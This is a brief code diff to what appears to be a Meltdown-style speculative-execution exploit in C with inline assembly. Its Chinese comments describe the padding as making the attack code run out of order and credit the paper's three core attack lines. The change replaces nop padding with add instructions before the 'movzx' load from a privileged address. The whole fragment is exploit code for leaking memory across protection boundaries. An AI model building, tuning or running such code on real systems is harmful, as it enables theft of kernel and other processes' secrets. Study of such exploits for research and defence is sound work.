@@ -35,9 +35,9 @@ extern char stopspeculate[];
 
 static void speculate(unsigned long addr){
 	asm volatile (
-		/*塞一些空操作保证后面断攻击代码可以乱序执行*/
+		/*塞一些操作保证后面断攻击代码可以乱序执行*/
 		".rept 500\n\t"
-		"nop\n\t"
+		"add $0x987,%%rax\n\t"
 		".endr\n\t"
 		/*参考论文中的三行核心攻击代码*/
 		"movzx (%[addr]), %%eax\n\t"
